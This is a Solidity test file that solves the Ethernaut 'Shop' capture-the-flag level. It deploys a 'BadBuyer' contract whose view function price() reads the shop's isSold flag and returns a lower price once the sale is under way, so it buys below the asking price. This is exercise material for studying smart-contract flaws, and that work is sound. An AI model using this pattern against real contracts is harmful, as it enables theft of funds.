// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Shop.sol";
import "src/levels/ShopFactory.sol";

contract TestShop is BaseTest {
    Shop private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ShopFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Shop(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.isSold(), false);
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // The function price() is view, but it does not mean in can not change its behavior
        // It can not modify the state, but it can read it.
        // We can read Shop's isSold varible and decide what to return.
        // Shop calls price() twice and changes its isSold to true betwenn those calls.

        vm.startPrank(player, player);

        // Deploy BadBuyer contract
        BadBuyer badBuyer = new BadBuyer(level);

        // Call buy() function from BadBuyer contract
        badBuyer.buy();

        vm.stopPrank();
    }
}

contract BadBuyer {
    Shop public shop;

    constructor(Shop _shop) public {
        shop = _shop;
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 0 : 100;
    }

    function buy() public {
        shop.buy();
    }
}
